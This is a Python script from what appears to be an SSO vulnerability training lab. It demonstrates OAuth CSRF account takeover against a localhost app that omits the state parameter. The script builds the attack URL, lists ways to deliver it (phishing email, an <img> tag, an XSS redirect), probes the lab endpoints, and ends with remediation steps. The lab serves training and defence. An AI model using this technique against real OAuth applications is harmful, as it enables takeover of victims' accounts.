#!/usr/bin/env python3
"""
==============================================================
 SSO Vuln Lab — Attack: Lab 4 — OAuth CSRF (Missing State)
==============================================================
 Target:  http://localhost:5000/lab4
 Goal:    Force victim's browser to complete attacker's OAuth
          flow → link attacker's IdP identity to victim's app
          session (account takeover via CSRF)
 Impact:  Account takeover on applications with account linking
 CVSSv3:  8.8 (High)

 Root cause:
   Authorization request has no `state` parameter.
   Callback does not verify state against session.
   Browser CSRF causes victim to execute attacker's auth flow.

 Real HackerOne reports:
   HackerOne #137223  — Slack OAuth CSRF
   HackerOne #7914    — Twitter OAuth CSRF
   HackerOne #182370  — Facebook OAuth state bypass
   HackerOne #1245731 — Shopify Partner OAuth CSRF

 Attack flow (account linking scenario):
   1. Attacker starts OAuth flow at /lab4/login
   2. Intercepts before completing (gets authorization URL)
   3. Sends that URL to logged-in victim (email, XSS, etc.)
   4. Victim's browser follows URL → authenticates attacker's
      IdP identity → app links to victim's session
   5. Attacker now has access to victim's account
==============================================================
"""

import sys, requests, webbrowser
from urllib.parse import urlencode, urlparse, parse_qs

CLIENT_URL   = "http://localhost:5000"
OAUTH_SERVER = "http://localhost:4000"
CLIENT_ID    = "vulnerable-client"

def generate_csrf_payload():
    """
    Build an OAuth authorization URL without state parameter.
    When victim visits this URL, their browser completes the
    flow with the attacker's identity.
    """
    # Build authorization URL — NO state parameter
    params = {
        "response_type": "code",
        "client_id":     CLIENT_ID,
        "redirect_uri":  f"{CLIENT_URL}/lab4/callback",
        "scope":         "openid email profile",
        # state= ← INTENTIONALLY OMITTED (the vulnerability)
    }
    auth_url = f"{OAUTH_SERVER}/oauth/authorize?{urlencode(params)}"
    return auth_url

def demonstrate_csrf():
    print("""
╔══════════════════════════════════════════════════════╗
║  LAB 4 — OAuth CSRF (Missing State Parameter)       ║
╚══════════════════════════════════════════════════════╝

OAuth state parameter serves as a CSRF token.
When missing, an attacker can:
  1. Pre-authorize as themselves
  2. Trick victim into hitting the callback URL
  3. Victim's session gets linked to attacker's identity
""")

    csrf_url = generate_csrf_payload()

    print(f"[*] CSRF Attack URL (no state):\n{csrf_url}\n")

    print("""[*] Attack Scenarios:
  A) Send URL in phishing email:
       "Click here to access your account" → CSRF URL

  B) Embed in <img> or <iframe> on attacker's website:
       <img src="{csrf_url}">

  C) Use XSS on any page victim is browsing:
       window.location = '{csrf_url}'

  D) Email client auto-loading remote images
""".format(csrf_url=csrf_url))

    # Verify the /lab4/csrf_poc endpoint works
    print("[*] Testing /lab4/csrf_poc endpoint...")
    try:
        r = requests.get(f"{CLIENT_URL}/lab4/csrf_poc", timeout=5)
        if r.status_code == 200:
            print("[✓] CSRF PoC endpoint is live")
            print(f"[*] Visit: {CLIENT_URL}/lab4/csrf_poc")
        else:
            print(f"[!] Endpoint returned: {r.status_code}")
    except Exception as e:
        print(f"[!] Could not reach client: {e}")

    # Automated demonstration
    print("\n[*] Automated demonstration:")
    print("[*] Step 1: Attacker starts OAuth flow as hacker@attacker.com")

    session = requests.Session()
    r = session.get(f"{CLIENT_URL}/lab4/login", allow_redirects=True)
    print(f"[*] Final URL after login initiation: {r.url}")

    print("""
[*] Step 2: In a real attack, attacker intercepts before step 2
            and captures the authorization URL:
            {url}

[*] Step 3: Send this URL to victim. When victim clicks:
  - OAuth server sees victim's session cookie → authenticates victim
  - Callback fires WITHOUT state check
  - App trusts the code and logs in attacker identity
  - Victim now authenticated as attacker, or attacker has access

[*] Step 4: Verify no state in the authorization request:
""".format(url=csrf_url))

    # Check no state in the actual request
    import urllib.request
    try:
        import urllib.parse
        r2 = requests.get(f"{CLIENT_URL}/lab4/login",
                          allow_redirects=False, timeout=5)
        location = r2.headers.get("Location","")
        parsed   = urlparse(location)
        qs       = parse_qs(parsed.query)
        if "state" not in qs:
            print("[✓] CONFIRMED: No state parameter in authorization URL!")
            print(f"[✓] Auth URL: {location[:100]}...")
        else:
            print(f"[?] state={qs.get('state')} found — partial protection")
    except Exception as e:
        print(f"[!] {e}")

    print(f"""
╔══════════════════════════════════════════════════════╗
║  REMEDIATION:                                        ║
║    1. Generate cryptographically random state        ║
║       state = secrets.token_urlsafe(32)             ║
║    2. Store in session: session['oauth_state'] = state ║
║    3. Include in auth URL: ?state={{state}}         ║
║    4. Verify on callback:                           ║
║       if request.args['state'] != session['oauth_state']:║
║           abort(403)                                ║
╚══════════════════════════════════════════════════════╝
""")

if __name__ == "__main__":
    demonstrate_csrf()
